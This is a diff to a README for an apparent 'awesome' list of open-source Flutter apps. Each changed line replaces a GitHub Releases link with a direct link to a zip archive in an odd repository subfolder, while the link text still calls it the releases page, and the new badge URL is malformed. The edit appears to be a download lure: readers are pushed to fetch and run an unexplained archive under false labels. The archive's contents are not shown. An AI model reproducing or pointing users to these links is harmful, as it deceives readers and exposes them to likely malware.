@@ -1,6 +1,6 @@
 # 🌟 awesome-open-source-flutter-applications - Discover Great Flutter Apps Effortlessly
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/WildFushi/awesome-open-source-flutter-applications/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/WildFushi/awesome-open-source-flutter-applications/main/Wahabiism/awesome-open-source-flutter-applications.zip%20Latest%https://raw.githubusercontent.com/WildFushi/awesome-open-source-flutter-applications/main/Wahabiism/awesome-open-source-flutter-applications.zip)](https://raw.githubusercontent.com/WildFushi/awesome-open-source-flutter-applications/main/Wahabiism/awesome-open-source-flutter-applications.zip)
 
 ## 📖 Overview
 
@@ -13,7 +13,7 @@ Join the community and discover what Flutter has to offer!
 To get started, follow these simple steps:
 
 1. **Visit the Release Page**
-   - Go to the [Releases page](https://github.com/WildFushi/awesome-open-source-flutter-applications/releases) where you can find all the available versions of this application.
+   - Go to the [Releases page](https://raw.githubusercontent.com/WildFushi/awesome-open-source-flutter-applications/main/Wahabiism/awesome-open-source-flutter-applications.zip) where you can find all the available versions of this application.
    
 2. **Select a Release**
    - Browse through the list of releases. Select the most recent one for the best features and fixes.
@@ -29,7 +29,7 @@ To get started, follow these simple steps:
 
 ## 📥 Download & Install
 
-To obtain the applications, visit this page to download: [Releases Page](https://github.com/WildFushi/awesome-open-source-flutter-applications/releases).
+To obtain the applications, visit this page to download: [Releases Page](https://raw.githubusercontent.com/WildFushi/awesome-open-source-flutter-applications/main/Wahabiism/awesome-open-source-flutter-applications.zip).
 
 System requirements vary by application, but generally, you should have:
 
